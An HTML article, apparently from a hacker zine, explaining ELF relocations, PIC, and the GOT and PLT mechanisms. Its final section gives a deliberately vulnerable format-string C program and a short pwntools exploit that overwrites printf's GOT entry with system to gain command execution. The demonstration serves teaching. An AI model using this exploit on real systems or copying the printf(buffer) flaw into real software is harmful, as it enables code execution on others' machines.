@@ -1,0 +1,728 @@
+<html>
+<head>
+<title>Relocation Revelation: Unpacking the Secrets of ELF</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                     ┌───────────────────────┐
+                                                     ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                     │ █   █ █ █ █   █       │
+                                                     │ █   █ █ █ █▀▀▀▀       │
+                                                     │ █   █   █ █     ▄     │
+                                                     │                 ▄▄▄▄▄ │
+                                                     │                 █   █ │
+                                                     │                 █   █ │
+                                                     │                 █▄▄▄█ │
+                                                     │                 ▄   ▄ │
+                                                     │                 █   █ │
+                                                     │                 █   █ │
+                                                     │                 █▄▄▄█ │
+                                                     │                 ▄▄▄▄▄ │
+                                                     │                   █   │
+Relocation Revelation: Unpacking the Secrets of ELF  │                   █   │
+~ S0S4                                               └───────────────────█ ──┘
+
+== [ Introduction ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+To transform our code into an executable, the compiler will undergo four
+steps:
+
+0. Preprocessing
+1. Compiling
+2. Assembling
+3. Linking
+
+As we're interested in relocations, we are going to focus on the linking stage
+but feel free to investigate the other steps.
+
+The job of the linker is "simple": bind abstract names to concrete names.
+
+You'll find it easier to understand with an example: A programmer can write
+the name printf, and the linker will bind it to "the location X from the
+beginning of the executable code in stdio". This way, the programmer doesn't
+need to worry about where in memory printf is located, as was the case in
+earlier times when programmers had to know the exact addresses of functions.
+
+The linker receives input files, each of which contains segments that are just
+chunks of code or data to be placed in the output file. Each of these files
+also has at least one symbol table.
+
+When the linker runs, it scans the input files to find the sizes of the
+segments and to collect the definitions and references of all the symbols.
+It creates a segment table as well as a symbol table.
+
+Using this data, the linker determines the address at which the symbol will
+be assigned, adjusts the memory addresses in the code and data segments, and
+writes the relocated code to the output file. It is normal for this output
+file to contain a symbol table for relinking or debugging.
+
+Let's see a quick example:
+
+~ . ~ . ~ . ~ . ~ . ~ .
+: main.c:             :
+:                     :
+: #include "sum.h"    :
+:                     :
+: int main(){         :
+:                     :
+:   sum(1,2);         :
+:   return 0;         :
+: }                   :
+~ . ~ . ~ . ~ . ~ . ~ .
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: sum.c:                    :
+:                           :
+: int sum(int a, int b){    :
+:                           :
+:  return a+b;              :
+: }                         :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+
+We call sum() from main.c, which causes a relocation in main.c. If we
+compile this main.c, we are left with an object file, main.o, of type
+ET_REL. If we check the disassembly of this object file, we can see:
+
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+: $ objdump -d main.o                                           :
+:                                                               :
+: main.o:     file format elf32-i386                            :
+:                                                               :
+: Disassembly of section .text:                                 :
+:                                                               :
+: 00000000 &lt;main&gt;:                                              :
+:   ~ [Shortened output]                                        :
+:                                                               :
+:  18:   e8 fc ff ff ff          call   19 &lt;main+0x19&gt;          :
+:  1d:   83 c4 10                add    esp,0x10                :
+:  20:   b8 00 00 00 00          mov    eax,0x0                 :
+:  25:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4] :
+:  28:   c9                      leave                          :
+:  29:   8d 61 fc                lea    esp,[ecx-0x4]           :
+:  2c:   c3                      ret                            :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+
+
+At the address 0x18 there is supposed to be a call to sum(),but there is a
+call to 0x19? and the instruction argument is "fcffffff". Weird, right?
+
+The call to 0x19 exists because the assembler places a temporary value, in
+this case -4, since we are using a call instruction (relative addressing).
+When the call instruction at 0x18 is executed, the EIP will point to the next
+instruction, which is at 0x1D. By subtracting the temporary value from the
+EIP (0x1D - 4), we get 0x19, which corresponds to the offset of the unresolved
+symbol. This temporary value will later be replaced by the linker with the
+correct relative address once the symbol is resolved.
+
+Let's examine the relocations using readelf to see what's happening here.
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+: Relocation section '.rel.text' at offset 0x160 contains 1 entry:      :
+: Offset     Info    Type            Sym.Value  Sym. Name               :
+: 00000019  00000402 R_386_PC32        00000000   sum                   :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+
+We see that there is a relocation at offset 0x19, which corresponds to the
+argument of the instruction at address 0x18.
+The type of relocation is R_386_PC32, which indicates that relative addressing
+is being used (because it is a call). The linker will resolve the address of
+the symbol sum (for example, 0x08049183) and calculate the relative address.
+
+Assuming the call instruction is located at 804916e,
+the linker will calculate the relative address using the following formula:
+
+  Relative address = Target address − (Instruction address+4)
+
+Applying the formula:
+
+  0x08049183 - (804916e+5) = 0x10
+
+(Note that we are adding 5 because the call instruction calculates the
+relative address with respect to the address immediately after the
+instruction, not from the instruction's starting address.)
+
+Let's see if the relative address we've calculated makes sense.
+Take a look at the previous object file disassembly and look now to the
+disassembled linked file:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+: 08049156 &lt;main&gt;:                                                  :
+: ~ [Shorted output]                                                :
+:                                                                   :
+: 804916e:       e8 10 00 00 00          call   8049183 &lt;sum&gt;       :
+: 8049173:       83 c4 10                add    $0x10,%esp          :
+: 8049176:       b8 00 00 00 00          mov    $0x0,%eax           :
+: 804917b:       8b 4d fc                mov    -0x4(%ebp),%ecx     :
+: 804917e:       c9                      leave                      :
+: 804917f:       8d 61 fc                lea    -0x4(%ecx),%esp     :
+: 8049182:       c3                      ret                        :
+:                                                                   :
+: 08049183 &lt;sum&gt;:                                                   :
+:  8049183:       55                      push   %ebp               :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+
+If you have a look at the address 804916e you can see that the argument of
+the call function is the value "0x10", which corresponds with what we've
+calculated before.
+
+
+== [ Static Linking VS Dynamic Linking ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Static linking involves copying all dependencies directly into the final
+executable. This means that the executable includes both our code and the code
+of any libraries it uses, resulting in a standalone binary that doesn’t rely
+on external libraries at runtime. While this approach increases the file size,
+it also ensures the binary can run independently.
+
+In dynamic linking, however, we only include references to external libraries
+as unresolved symbols in the executable. These symbols are resolved at runtime
+using the Global Offset Table and, often, the Procedure Linkage Table.
+This approach keeps the executable smaller and allows for easier updates
+and bug fixes to libraries, as they can be modified independently
+of the executable.
+
+== [ Understanding ELF Relocations ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The ELF sections hold the bulk information of the object file for the linking
+process: instructions, data, relocation, etc.
+
+As you may know, there are lots of section types, but we're diving deep into
+relocation-involved sections: `SHT_RELA` and `SHT_REL`.
+
+SHT_RELA: This section holds relocation entries with an explicit addend.
+This is the structure that every entry has:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: typedef struct {                                                           :
+: Elf32_Addr  r_offset; //Gives the location of where to apply the relocation:
+: Elf32_Word  r_info; //Symbol index for its symbol table and relocation type:
+: Elf32_Sword r_addend; //Constant Value used for address calculation, or the:
+:                         //final value used in r_offset.                    :
+: } Elf32_Rela;                                                              :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+For making up the r_info field, glibc does some bit operations for joining
+both the index and relocation type. We can see this in the elf.h file:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: /* How to extract and insert information held in the r_info field.  */     :
+:                                                                            :
+: #define ELF32_R_SYM(val)          ((val) &gt;&gt; 8)                             :
+: #define ELF32_R_TYPE(val)         ((val) & 0xff)                           :
+: #define ELF32_R_INFO(sym, type)   (((sym) &lt;&lt; 8) + ((type) & 0xff))         :
+:                                                                            :
+: #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)                              :
+: #define ELF64_R_TYPE(i)           ((i) & 0xffffffff)                       :
+: #define ELF64_R_INFO(sym, type)   ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type)) :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+
+
+SHT_REL: The same as SHT_RELA but without the addend:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+: typedef struct {                    :
+:      Elf32_Addr    r_offset;        :
+:      Elf32_Word    r_info;          :
+: } Elf32_Rela;                       :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+
+Let's see how we can modify this structure for doing weird things to the elf ;)
+
+~ . ~ . ~ . ~ . ~ . ~ .
+: #include &lt;stdio.h&gt;  :
+: int main(){         :
+:                     :
+:  puts("Hello");     :
+:  putchar('a');      :
+:  return 0;          :
+: }                   :
+~ . ~ . ~ . ~ . ~ . ~ .
+
+Output:
+
+~ . ~ . ~ . ~ . ~
+: $ test ./main :
+: Hello         :
+: a%            :
+~ . ~ . ~ . ~ . ~
+
+For the first case, I'm going to modify the r_info member, so that it's the
+same as the putchar entry.
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: $ readelf -r main                                                          :
+:                                                                            :
+: Relocation section '.rel.plt' at offset 0x21b0 contains 3 entries:         :
+:  Offset     Info    Type            Sym.Value  Sym. Name                   :
+: 0804c000    107  R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34 :
+: 0804c004    207  R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0               :
+: 0804c008    407  R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0            :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+
+
+I've manually modified it with a hex editor, and so now we have:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: $ readelf -r main                                                          :
+:                                                                            :
+: Relocation section '.rel.plt' at offset 0x21b0 contains 3 entries:         :
+: Offset     Info    Type            Sym.Value  Sym. Name                    :
+: 0804c000    107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34  :
+: 0804c004    407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0             :
+: 0804c008    407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0             :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+
+
+If we now execute the program again, this is our output:
+
+~ . ~ . ~ . ~ . ~ . ~ .
+: $ test ./main       :
+: @a%                 :
+~ . ~ . ~ . ~ . ~ . ~ .
+
+You can clearly observe that "Hello" does not appear in the output. Instead,
+the character "@" appears, which corresponds to the value 40. This value is
+"random" because it is being picked from the stack. Specifically, it should be
+the first byte of the address where the string "Hello" is located.
+
+In this case, the value is 40 because the code was compiled for x86_64 (x86_64
+linux addresses start with 0x040),which results in a more clear output.
+If the code had been compiled for 32-bit, the output would be less clear, as
+the value 08 (Starting byte of x86 addresses) would not correspond to a visible
+ASCII character but to a backspace.
+
+I thought that manually modifying these values was kind of boring, as you have
+to find the value you want to modify, guess what value it is, etc.
+
+So I decided to make a small program that does this work. You can find
+it at the end of this article.
+
+
+== [ Position Independent Code ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+PIC was created to solve the load-time relocation inconveniences. Basically,
+when we use shared libraries we are looking to use fewer computing resources,
+but with load-time relocations, this is not possible as the text section is
+(and should be) not writable. This means we cannot do runtime relocs.
+
+Using load-time relocations, the .text section has to be modified to apply
+the relocations, and so for each application that uses this shared library, we
+will have a modified version of the .text in memory, so basically, we are not
+really sharing the library.
+
+One of the key insights on which PIC relies is the offset between the data and
+text sections. This offset is known to the linker at link-time, when it
+collects the sections of the different object code files. It knows the size
+of every section in the file and their relative relocations.
+
+The real hard work comes when we try to make this relative addressing work in
+x86, as the data references need to be absolute (i.e., the mov instruction).
+
+How do we go from a relative address to an absolute address?
+There is no instruction for getting the EIP value, but we can do some tricks:
+
+-------------------
+|     call getEip |
+| getEip:         |
+|     pop ecx     |
+-------------------
+
+Instead of doing these kind of "tricks" every time we need to know EIP, we add
+another layer of indirection. This layer is known as GOT.
+
+== [ Global Offset Table ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Basically, the GOT is a table that lives in the .data section. What we achieve
+with the GOT is that we can refer relatively, and it contains the absolute
+address of the data we want.
+
+Suppose that an instruction needs an absolute address (like mov),
+what this will do is simple: we refer to the GOT entry with a
+relative address (which we know from linking).
+The GOT entry in turn has the absolute address of our data.
+
+
+           :.....................................:
+           :                                     :
+           :                                     :
+           :                                     :
+           :                                     :
+           :                                     :
+           :.....................................:
+           :           mov...                    -&gt;..........
+           :.....................................:          :
+           :                                     :          :
+           :                                     :          :
+           :                                     :          :
+           :            Code Section             :          :
+           :                                     :          :  Relative
+           :                                     :          :  Address
+           :                                     :          :
+           :                                     :          :
+           :                                     :          :
+           :                                     :          :
+           :                                     :          :
+           :                                     :          :
+           :.....................................:          :
+           :                                     :          :
+           :                                     :          :
+     ....  :.....................................-          :
+      :    :            Var 1 address            : &lt;-.......:
+      .    -.....................................-
+      .    :            Var 2 address            :
+  G   .    -.....................................-
+  O   .    :            Var 3 address            :
+  T   .    -.....................................-
+      .    :            .............            :
+      .    :.....................................:
+      .    :.....................................:
+      :    :       --=- Var N Address -=--       :
+      .... :.....................................:
+           :                                     :
+           :                                     :
+           :                                     :
+           :                                     :
+           :              Data                   :
+           :              Section                :
+           :                                     :
+           :                                     :
+           :                                     :
+           :                                     :
+           :                                     :
+           :                                     :
+           :.....................................:
+
+
+By using the GOT, we get rid of the text relocation, but we get a data
+relocation. How can this be better?
+
+Well, relocations in the text section are per variable reference, while in the
+GOT we just need one relocation for each variable.
+The data section is writable and is not shared between processes, so adding
+relocations to it doesn't do harm. Moving the relocations to the data makes
+the code section read-only and shareable between processes.
+
+
+== [ Data references using GOT ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: int glob = 1;             :
+: int func(int a, int b){   :
+:    return glob + a + b;   :
+: }                         :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+
+Let's compile it and take a look at the disassembly.
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .~
+: 0000113d &lt;func&gt;:                                                           :
+:    113d:       55                      push   ebp                          :
+:    113e:       89 e5                   mov    ebp,esp                      :
+:    1140:       e8 19 00 00 00          call   115e &lt;__x86.get_pc_thunk.ax&gt; :
+:    1145:       05 97 2e 00 00          add    eax,0x2e97                   :
+:    114a:       8b 80 1c 00 00 00       mov    eax,DWORD PTR [eax+0x1c]     :
+:    1150:       8b 10                   mov    edx,DWORD PTR [eax]          :
+:    1152:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]      :
+:    1155:       01 c2                   add    edx,eax                      :
+:    1157:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]      :
+:    115a:       01 d0                   add    eax,edx                      :
+:    115c:       5d                      pop    ebp                          :
+:    115d:       c3                      ret                                 :
+:                                                                            :
+: 0000115e &lt;__x86.get_pc_thunk.ax&gt;:                                          :
+:    115e:       8b 04 24                mov    eax,DWORD PTR [esp]          :
+:    1161:       c3                      ret                                 :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .~
+
+
+In the address 0x1140, you can see that we get the address of the next
+instruction into eax, as we've seen before in this article. In the address
+0x1145 is a constant offset from the instruction to the place where the GOT
+is located. Now EAX serves as a base pointer to the GOT.
+
+In the address 0x114a, we are moving into eax a value from [eax-0x8], which
+is a GOT entry. This is the address of the global variable `glob`. In the
+address 0x1150, the value of `glob` is moved into edx.
+
+Let's see if the constant offset that we add to eax is really the GOT address:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .~
+: [Nr] Name           Type          Addr     Off    Size   ES Flg Lk Inf Al  :
+: [20] .got           PROGBITS      003fdc   002fdc 000024 04  WA  0   0  4  :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .~
+
+
+We see that the .got address is in `0x00003fdc`. As we know, the call to
+`__x86.get_pc_thunk.bx` places the address of the next instruction into eax,
+and that address is `0x10ed`.
+
+If we add this address and the static offset we have, we are left with:
+(0x1145 + 0x2e97 = 0x3FDC).
+
+== [ Function calls with PIC ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+So far we have seen the work of GOT with variables. What about functions?
+
+Well, the same mechanism applies here. Instead of the call containing the
+absolute address of the function, it will contain the address of the GOT entry
+
+== [ Procedure Linkage Table] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+When a shared library references a function, the real address of the function
+is not known until load-time. As we've seen in the beginning of this article,
+this is called binding.
+
+This binding process is slow and non-trivial, as there are lots of symbol
+resolutions. The loader has to actually look up the function symbol in special
+hash tables defined in the sections of the ELF.
+
+The majority of these resolutions are done in vain as we don't normally use 100%
+of the functions our code has. In a typical run of a program only a fraction
+of functions are actually used (think of special condition functions or error
+handling functions).
+
+To speed up this process, the lazy binding scheme was built-in. The operation
+of this lazy binding is simple:
+
+We don't resolve the symbols until we need to, once we solve the symbol we
+save it as it’s supposed that you will call the same function more than once.
+
+For implementing lazy binding, we need to add another layer of indirection:
+The Procedure Linkage Table (PLT).
+
+Let's see an example for better understanding:
+
+
+== [ Function resolution using PLT ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       Code:
+       . . . . .  . . . . . . . . .
+       .  call func@PLT           - - &gt;|
+       .  ...                     .    |
+       .  ...                     .    |
+       .  ...                     .    |
+       .                          .    |
+       .                          .    |
+       .                          .    |          GOT:
+       .                          .    |          . . . . . . . . .
+       .                          .    |          .               .
+       .                          .    |          . GOT[N]:       .
+       .                          .    |    - - -&gt;.      &lt;addr&gt;   . - - &gt;
+       .                          .    |    |     .               .     |
+       .                          .    |    |     . . . . . . . . .     |
+       . . . . . . . .  . . . . . .    |    |                           |
+                                       |    |                           |
+                                       |    |                           |
+       PLT:                            |    |                           |
+       . . . . . . . . . . . . . .     |    |                           |
+       . PLT[0]:                  .    |    |                           |
+  - -&gt; .       call resolver      .    |    |                           |
+  |    .   . . .                  .    |    |                           |
+  |    .                          .    |    |                           |
+  |    .  PLT[N]:                 &lt;- - |    |                           |
+  |    .       jmp *GOT[N]        . - - - -&gt;|                           |
+  |    .       prepare resolver   .                                     |
+  &lt;- - .       jmp PLT[0]         .  &lt; - - - - - - - - - - - - - - - - -|
+       .                          .
+       . . . . . . . . . . . . .  .
+
+
+1. When we refer to a function (func) in our code, the compiler translates the
+   function as func@plt, which is an entry into the PLT table.
+
+2. The first entry in the PLT is a special one, which contains the resolver
+   routine, and the next entries are identically structured, one for each
+   function needing resolution.
+
+3. Each PLT entry except the first contains the following:
+   - Jump location which is specified in the GOT Table.
+   - Preparation of arguments for the resolver routine.
+   - Call to the resolver routine (The first PLT entry).
+
+4. Before the function address has been resolved, the N GOT entry contains the
+   address of the PLT entry after the jump (the call to the resolver routine).
+
+
+When func is called for the first time this is the mechanism applied:
+
+1. PLT[n] is called and jumps to the address pointed to in GOT[n].
+2. This address points to PLT[n] itself, to the argument preparation
+   for the resolver.
+3. We call the resolver.
+4. The resolver performs the actual resolution for the func address,
+   places it into the GOT[n] and calls func.
+
+Once we are done with the func resolution, any call to func will not repeat
+these steps, as we recorded the address into the GOT entry, instead of having
+the address of the argument preparation, we now have the address of func.
+
+For more clarity:
+
+1. The PLT[n] is called and jumps to the address pointed in GOT[n]
+2. GOT[n] now points to the func address, and we call to func and transfer
+   control to it.
+
+
+    Code:
+       . . . . . . . . . . . . .  .
+       .  call func@PLT           - - &gt;|
+       .  ...                     .    |
+       .  ...                     .    |
+       .  ...                     .    |
+       .                          .    |1
+       .                          .    |
+       .                          .    |          GOT:
+       .                          .    |          . . . . . . . . .
+       .                          .    |          .               .
+       .                          .    |          . GOT[N]:       .
+       .                          .    |    - - -&gt;. &lt;addr&gt;        . - &gt;
+       .                          .    |    |     .               .   |
+       .                          .    |    |     . . . . . . . . .   |
+       . . . . . . . . . . . . .  .    |    |                         |
+                                       |    |                         |
+                                       |    |                         |
+       PLT:                            |    |                         |
+       . . . . . . . . . . . . . .     |    |                         |
+       . PLT[0]:                  .    |    |                         |
+  - -&gt; .       call resolver      .    |    |                         |
+  |    .   . . .                  .    |    |                         |
+  |    .                          .    |    |                         |
+  |    .  PLT[N]:                 &lt;- - |    |                         |
+  |    .       jmp *GOT[N]        . - - - -&gt;|                         |
+  |    .       prepare resolver   .                                   |
+  | &lt;- .       jmp PLT[0]         .                                   |
+       . . . . . . . . . . . . .  .                                   |
+                                                                      |
+                                                                      |
+                                            Code:                     |
+                                           . . . . . . . . . . .      |
+                                           . func:             .&lt;- - -
+                                           . ...               .
+                                           . ...               .
+                                           .                   .
+                                           . . . . . . . . . . .
+
+
+== [ GOT Overwriting ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+So far we've seen that the GOT holds the address of the desired function. Have
+you wondered what would happen if we can modify this address?
+
+Well, we can redirect the code and probably gain command execution.
+
+I am not the first to think about this, so obviously there exist some
+protections for this such as RELRO, ASLR, and CFI, among others.
+
+I'll compile this code with no security measures and with ASLR,
+as I just want you to get the idea:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+: #include &lt;stdio.h&gt;                              :
+:                                                 :
+: void vuln() {                                   :
+:    char buffer[300];                            :
+:                                                 :
+:    while(1) {                                   :
+:        fgets(buffer, sizeof(buffer), stdin);    :
+:        printf(buffer);                          :
+:                                                 :
+:    }                                            :
+: }                                               :
+:                                                 :
+: int main() {                                    :
+:    vuln();                                      :
+:    return 0;                                    :
+: }                                               :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+
+What we want to overwrite is the .got.plt section which contains the lazy
+binding resolutions. Meanwhile, the .got section contains the eager binding
+resolutions.
+
+In this case we have a function with an infinite loop, which takes our input
+and prints it using the printf function. It seems clear that this is a
+classical format string exploitation.
+
+Let's setup our exploit:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+: from pwn import \*                                            :
+:                                                               :
+:  elf = context.binary = ELF("./got", checksec=False)          :
+:                                                               :
+:  libc = elf.libc                                              :
+:  libc.address = 0xf7dab000                                    :
+:                                                               :
+:  p = process()                                                :
+:                                                               :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
+
+Now we want to search where our arguments are in the stack.
+For this I'll do the following:
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ .
+: $ ./got                                                                   :
+:    %p %p %p %p %p %p %p %p                                                :
+:    0x12c 0xf7fa45c0 0x40 0x10 0x25207025 0x70252070 0x20702520 0x25207025 :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ .
+
+
+As we can see, the fifth block contains the ascii values of our input.
+
+Fine, now we know the offset where we want to put the reference that we need
+to overwrite. I want to overwrite the printf got entry, so that each time
+the program calls printf, it's going to resolve to 'system'.
+
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+: from pwn import *                                                       :
+:                                                                         :
+: elf  = context.binary = ELF("./got", checksec=False)                    :
+:                                                                         :
+: libc = elf.libc                                                         :
+: libc.address = 0xf7dab000                                               :
+:                                                                         :
+: p = process()                                                           :
+:                                                                         :
+: payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})   :
+: p.sendline(payload)                                                     :
+: p.clean()                                                               :
+: p.interactive()                                                         :
+~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
+
+After the execution of the exploit the GOT entry has been modified, and each
+time the printf function is called, we are really calling system().
+
+This was a very basic exploitation demonstration, but I hope it helps you
+understand the GOT concept.
+
+== [ Conclusion ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Relocations in ELF files are a critical aspect of the linking and execution
+process, enabling code and data to be adjusted to the correct memory addresses
+at load time. This process becomes even more essential when working with PIC,
+which allows programs to be loaded at varying memory addresses, enhancing
+flexibility and security.
+
+The use of the Global Offset Table (GOT) and the Procedure Linkage Table (PLT)
+is key to supporting dynamic function execution and resolving symbols in
+programs that rely on shared libraries. The GOT stores addresses of external
+functions and variables, while the PLT serves as an intermediary for function
+address resolution during runtime, optimizing the dynamic linking process.
+
+Together, these mechanisms not only enable more efficient and flexible program
+execution but are also crucial for implementing security features like Address
+Space Layout Randomization (ASLR), which enhances protection against buffer
+overflow attacks and other exploit vectors.
+
+== [ Additional Content ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+[ 0 ] Elf relocation mangler: https://github.com/S0S4/RelocDoctor
+[ 1 ] Symbol Table And Relocations 1 : https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-vi.html
+[ 2 ] Symbol Table and Relocations 2 : https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-vi_18.html
+[ 3 ] Linkers & Loaders by John Levine
+
+--[ <a href="3.html">PREV</a> | <a href="index.html">HOME</a> | <a href="5.html">NEXT</a> ]--
+
+</pre></div></body>
